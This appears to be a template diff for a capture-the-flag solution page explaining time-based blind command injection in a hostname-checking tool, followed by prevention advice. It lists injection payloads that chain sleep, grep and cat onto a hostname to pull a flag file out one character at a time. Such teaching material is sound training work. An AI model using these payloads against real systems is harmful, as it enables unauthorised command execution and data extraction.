@@ -1,0 +1,109 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: Time-Based Blind Command Injection - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">Solution: Time-Based Blind Command Injection</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <i class="bi bi-info-circle-fill me-2"></i>
+                    <strong>Challenge:</strong> Exploit the time-based blind command injection vulnerability to read the contents of the flag.txt file on the server.
+                </div>
+
+                <h3 class="mt-4">Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates a time-based blind command injection vulnerability in a server status checking tool. The application takes a hostname as input and uses it in a command to check if the server is online, but it doesn't properly sanitize the input before using it in a system command.
+                </p>
+                <p>
+                    In a time-based blind command injection scenario, the output of the injected command is not directly visible to the attacker. Instead, the attacker must use timing differences in the application's response to extract information.
+                </p>
+
+                <h3 class="mt-4">Solution Steps</h3>
+                <ol>
+                    <li>
+                        <p><strong>Identify the vulnerability:</strong> The application allows users to enter a hostname, which is then used in a command to check server status.</p>
+                    </li>
+                    <li>
+                        <p><strong>Test for command injection:</strong> First, we need to confirm that command injection is possible by using a payload that introduces a delay.</p>
+                        <p>Try entering:</p>
+                        <pre class="bg-light p-3 rounded"><code>example.com && sleep 5</code></pre>
+                        <p>If the application takes about 5 seconds to respond, this confirms that command injection is possible.</p>
+                    </li>
+                    <li>
+                        <p><strong>Extract the flag using conditional timing:</strong> Since we can't see the output directly, we need to use conditional execution with timing to extract the flag character by character.</p>
+                        <p>For example, to check if the flag starts with "R", we can use:</p>
+                        <pre class="bg-light p-3 rounded"><code>example.com && grep -q "^R" flag.txt && sleep 5</code></pre>
+                        <p>If there's a 5-second delay, it means the flag starts with "R".</p>
+                    </li>
+                    <li>
+                        <p><strong>Extract the full flag:</strong> Continue this process for each character position in the flag.</p>
+                        <p>For example, to check the second character:</p>
+                        <pre class="bg-light p-3 rounded"><code>example.com && grep -q "^R0" flag.txt && sleep 5</code></pre>
+                        <p>If there's no delay, try another character:</p>
+                        <pre class="bg-light p-3 rounded"><code>example.com && grep -q "^R1" flag.txt && sleep 5</code></pre>
+                        <p>Continue until you've extracted the entire flag.</p>
+                    </li>
+                    <li>
+                        <p><strong>Alternative approach:</strong> Instead of extracting the flag character by character, you can try to read the entire flag at once:</p>
+                        <pre class="bg-light p-3 rounded"><code>example.com && cat flag.txt | grep "R00T" && sleep 10</code></pre>
+                        <p>If there's a 10-second delay, it means the flag contains "R00T", which is the expected format.</p>
+                    </li>
+                </ol>
+
+                <h3 class="mt-4">Alternative Payloads</h3>
+                <p>There are several ways to exploit this vulnerability:</p>
+                <ul>
+                    <li><code>example.com && sleep 5</code> - Basic command injection with sleep</li>
+                    <li><code>example.com; sleep 5</code> - Using semicolon for command chaining</li>
+                    <li><code>example.com | sleep 5</code> - Using pipe operator</li>
+                    <li><code>example.com `sleep 5`</code> - Using command substitution</li>
+                    <li><code>example.com $(sleep 5)</code> - Using command substitution with $()</li>
+                    <li><code>example.com && cat flag.txt && sleep 5</code> - Reading the flag and causing a delay</li>
+                    <li><code>example.com && [ -f flag.txt ] && sleep 5</code> - Checking if flag.txt exists and causing a delay</li>
+                </ul>
+
+                <h3 class="mt-4">Prevention</h3>
+                <p>To prevent time-based blind command injection vulnerabilities:</p>
+                <ol>
+                    <li>
+                        <p><strong>Input Validation:</strong> Validate and sanitize user input before using it in commands.</p>
+                    </li>
+                    <li>
+                        <p><strong>Use Safe APIs:</strong> Avoid using shell commands. Instead, use language-specific APIs that don't involve shell interpretation.</p>
+                    </li>
+                    <li>
+                        <p><strong>Allowlist Approach:</strong> Only allow specific characters or patterns in user input.</p>
+                    </li>
+                    <li>
+                        <p><strong>Command Timeouts:</strong> Implement timeouts for command execution to limit the effectiveness of time-based attacks.</p>
+                    </li>
+                    <li>
+                        <p><strong>Principle of Least Privilege:</strong> Run applications with the minimum privileges required to function properly.</p>
+                    </li>
+                </ol>
+
+                <h3 class="mt-4">Real-World Examples</h3>
+                <p>
+                    Time-based blind command injection has been found in various real-world applications:
+                </p>
+                <ul>
+                    <li>Network monitoring tools that check server status</li>
+                    <li>Diagnostic utilities that ping or trace routes to hosts</li>
+                    <li>Server management interfaces that execute commands on remote systems</li>
+                    <li>IoT device management systems that check device connectivity</li>
+                </ul>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('cmdi_level7') }}" class="btn btn-outline-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end"><i class="bi bi-list me-2"></i>All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
